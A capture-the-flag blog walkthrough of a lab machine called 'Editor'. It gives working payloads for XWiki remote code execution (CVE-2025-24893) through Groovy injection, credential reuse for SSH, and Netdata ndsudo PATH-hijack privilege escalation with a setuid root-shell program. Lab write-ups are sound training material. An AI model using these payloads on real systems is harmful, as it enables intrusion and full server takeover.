---
layout: post
title: "A Machine for Editing"
date: 2025-09-08
---

## Challenge Description
This was another Machine to pwn.

## Solution
If we directly open the IP on the browser we cannot connect to the webpage. Lets start by running `nmap` and `dirsearch` as always, in order to start gathering some informations.

`nmap 10.10.11.80`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 14:40 CEST
Nmap scan report for 10.10.11.80
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

`python dirsearch.py -u 10.10.11.80`

```
Target: http://10.10.11.80/

[14:41:28] Scanning: 
[14:41:38] 302 -   154B - /b  ->  http://editor.htb/                        
[14:41:41] 302 -   154B - /d  ->  http://editor.htb/                        
[14:41:41] 302 -   154B - /e  ->  http://editor.htb/                        
[14:41:41] 302 -   154B - /edit  ->  http://editor.htb/                     
[14:41:41] 302 -   154B - /editor  ->  http://editor.htb/                   
[14:41:43] 302 -   154B - /h  ->  http://editor.htb/                        
[14:41:44] 302 -   154B - /i  ->  http://editor.htb/                        
[14:41:44] 302 -   154B - /it  ->  http://editor.htb/                       
[14:41:48] 302 -   154B - /o  ->  http://editor.htb/                        
[14:41:49] 302 -   154B - /p  ->  http://editor.htb/                        
[14:41:51] 302 -   154B - /r  ->  http://editor.htb/                        
[14:41:53] 302 -   154B - /t  ->  http://editor.htb/
```

From this output we understand that we have to resolve correctly the address so lets add it to /etc/hosts

`sudo nano /etc/hosts`

`10.10.11.80 editor.htb`

Now if we go back to the browser we are able to access the webpage correctly.

If we go to `editor.htb:8080`, we will find an `xWiki` webpage that is running on version `15.10.8`.
Lets look online if there are vulnerabilities we can levarage on that version of `xWiki`.

Version `15.10.8` of `xWiki` seems to be correlated to this `CVE-2025-24893`, and its affecting all versions prior to `15.10.11`.

I found this poc on github:

`https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py`

`python poc.py`

```
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): http://editor.htb:8080/xwiki
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://editor.htb:8080/xwiki
[+] Sending request to: http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✔] Exploit successful! Output received:

root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```

This POC is just crafting the payload to abuse the fact that xWiki allows Groovy scripts inside wiki macros: `{{groovy}} ... {{/groovy}}`. It first closes any open XWiki macros before injecting ours, then we insert the code we want to execute inside here `{{groovy}} ... {{/groovy}}` and it will be executed on the server. By doing so we can achieve RCE in xWiki. The POC is printing the `/etc/passwd/`, lets see if we can adapt it to extract some more information.

```
curl "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22ls%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

```
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
webapps
```

If we run the same request but by executing the `id` command we got this:

`uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)`

This confirms us that we don't have root access while executing these commands, so a privilage escalation will be needed later.

This is the output of the `env` command:

```
PWD=/usr/lib/xwiki-jetty
LOGNAME=xwiki
SYSTEMD_EXEC_PID=1043
HOME=/var/lib/xwiki
LANG=en_US.UTF-8
INVOCATION_ID=ecfc283ef73d4cf7b0ab309bea524681
USER=xwiki
SHLVL=0
JOURNAL_STREAM=8:22032
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/var/lib/xwiki
```

`ls -la on start_xwiki.sh`

`-rw-r--r-- 1 root root 9340 Mar 27 2024 start_xwiki.sh`

So we cannot use it. Lets take a look at the structure of the directories, maybe we can spot something usefull.

`ls /../..`

```
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

`ls ../../var/`

```
backups
cache
crash
lib
local
lock
log
mail
opt
run
spool
tmp
www
```

`ls ../../var/lib`

```
apt
boltd
cloud
command-not-found
containerd
dbus
dhcp
docker
dpkg
fwupd
git
grub
landscape
logrotate
man-db
mecab
misc
mysql
mysql-files
mysql-keyring
mysql-upgrade
nginx
os-prober
PackageKit
pam
plymouth
polkit-1
private
python
shells.state
sudo
systemd
tomcat9
tpm
ubuntu-advantage
ubuntu-drivers-common
ubuntu-fan
ubuntu-release-upgrader
ucf
udisks2
update-manager
update-notifier
upower
usb_modeswitch
usbutils
vim
vmware
xwiki
```

`ls ../../var/lib/xwiki/data`

```
cache
configuration.properties
extension
java_pid1043.hprof
jobs
logs
mails
observation
store
```

`cat ../../var/lib/xwiki/data/configuration.properties`

```
xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
```

`ls ../../var/log`

```
apt
audit
auth.log
btmp
btmp.1
dbconfig-common
dist-upgrade
dmesg
installer
journal
kern.log
kern.log.1
landscape
lastlog
laurel
mysql
nginx
private
syslog
syslog.1
tomcat9
vmware-network.log
vmware-vmsvc-root.log
vmware-vmtoolsd-root.log
wtmp
xwiki
```

`ls ../../var/log/laurel`

```
audit.log
audit.log.1
audit.log.10
audit.log.11
audit.log.12
audit.log.13
audit.log.14
audit.log.15
audit.log.16
audit.log.17
audit.log.18
audit.log.19
audit.log.2
audit.log.20
audit.log.21
audit.log.22
audit.log.23
audit.log.24
audit.log.25
audit.log.26
audit.log.27
audit.log.28
audit.log.29
audit.log.3
audit.log.30
audit.log.31
audit.log.32
audit.log.33
audit.log.34
audit.log.35
audit.log.36
audit.log.37
audit.log.38
audit.log.39
audit.log.4
audit.log.40
audit.log.41
audit.log.42
audit.log.43
audit.log.44
audit.log.45
audit.log.46
audit.log.5
audit.log.6
audit.log.7
audit.log.8
audit.log.9
```

`ls ../../var/log/xwiki`

```
2025_09_08.jetty.log
2025_09_08.request.log
```

`ls ../../run`

```
agetty.reload
auditd.pid
blkid
console-setup
containerd
credentials
crond.pid
crond.reboot
cryptsetup
dbus
dmeventd-client
dmeventd-server
docker
docker.pid
docker.sock
ebpf.pid
initctl
initramfs
irqbalance
lock
log
lvm
motd.d
motd.dynamic
mount
multipath
multipathd.pid
mysqld
netdata
network
nginx.pid
screen
sendsigs.omit.d
shm
sshd
sshd.pid
sudo
systemd
tmpfiles.d
ubuntu-advantage
ubuntu-fan
udev
udisks2
user
utmp
uuidd
vmware
```

Nothing usefull for now, lets go back to the main folder and lets take a look inside this path.

`ls webapps/xwiki/`

```
META-INF
redirect
resources
skins
templates
WEB-INF
```

`ls webapps/xwiki/WEB-INF/`

```
cache
classes
fonts
hibernate.cfg.xml
jboss-deployment-structure.xml
jetty-web.xml
lib
observation
portlet.xml
sun-web.xml
version.properties
web.xml
xwiki.cfg
xwiki-locales.txt
xwiki.properties
```

Got it! We found the `hibernate.cfg.xml` file! Its the main configuration file for Hibernate, it basically tells Hibernate how to connect to the database and how to map Java objects to tables. This means that if we are lucky we can found informations like: Driver, URL, username, password used by Hibernate to connect to the DB.

`cat webapps/xwiki/WEB-INF/hibernate.cfg.xml`

It will print a huge portion of code, lets copy paste it in an editor in order to make the searching process easier. I found the following data:

```
name="hibernate.connection.username" --> xwiki 
name="hibernate.connection.password" --> theEd1t0rTeam99
name="hibernate.connection.url" --> /xwiki/bin/create/Main/jdbc%3Amysql%3A%2F%2Flocalhost%2Fxwiki%3FuseSSL%3Dfalse/WebHome?parent=Main.SolrSearch
```

Since the `hibernate.cfg.xml` file is related to how the connections to the DBs are made, I used the retrived data for crafting specific payloads for dumping DB data:

```
curl "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22mysql%20-u%20xwiki%20-p'theEd1t0rTeam99'%20-D%20xwiki%20-N%20-B%20-e%20'SHOW%20TABLES%3B'
%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%2fasync%7d%7d"
```

Unfortunately I was not able to dump database data by using `xwiki/theEd1t0rTeam99`. But maybe the username is not correct. Since we dumped the `/etc/passwd/` lets look at the users and lets try to enstablish an ssh connection with this password `theEd1t0rTeam99`. By using `oliver` as user I was able to connect via ssh.

`cat user.txt`

`3878f923e6901d07d557d8d42e934d67`

The user flag is ours! Now lets move to the root flag.

Lets check if we can use sudo:

`sudo -l`

`Sorry, user oliver may not run sudo on editor.`

Ok lets start looking for some ways to become root. Lets look for uncommon SUID binaries or outdated binaries that have exploits.

`find / -perm -4000 -type f 2>/dev/null`

```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

Netdata binaries running with SUID or root privileges are interesting. They may have local privilege escalation vulnerabilities, especially older Netdata versions. In fact if we run:

`/opt/netdata/usr/sbin/netdata -v`

`netdata v1.45.2`

This version of netdata is correlated to `CVE-2024-32019` where as a user I have permission to run ndsudo:

The idea of the poc is to place an executable with a name that is on ndsudo’s list of commands (e.g. nvme) in a writable path. Set the PATH environment variable so that it contains this path and finally run ndsudo with a command that will run our executable.

`https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93`

Lets make this work:

`mkdir -p /tmp/exploit`

`echo -e '#!/bin/bash\n/bin/bash' > /tmp/exploit/nvme`

`chmod +x /tmp/exploit/nvme`

`export PATH=/tmp/exploit/:$PATH`

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`

```
oliver@editor:/tmp/exploit$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

It was indeed running the shell but I am still `oliver` and not `root`. Thats not good. Lets try something different but the idea will remain the same. Since I don't have any gcc, lets try to load a compiled `nvme.c` file through ssh.

```
#include <unistd.h>

int main() {
    setuid(0);   
    setgid(0);   
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

With this script we will hard-reset the `uid` and `guid` in order to guaranteed ourself root shell and run the shell.

`gcc nvme.c -o nvme`

`chmod +x nvme`

`scp nvme oliver@editor.htb:/tmp/exploit`

Once the upload of the `nvme.c` file is completed lets run again the command.

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`

We are finally root! Lets retrive the flag!

`ffaf237b3f0adce0ffc985b9a93ffc82`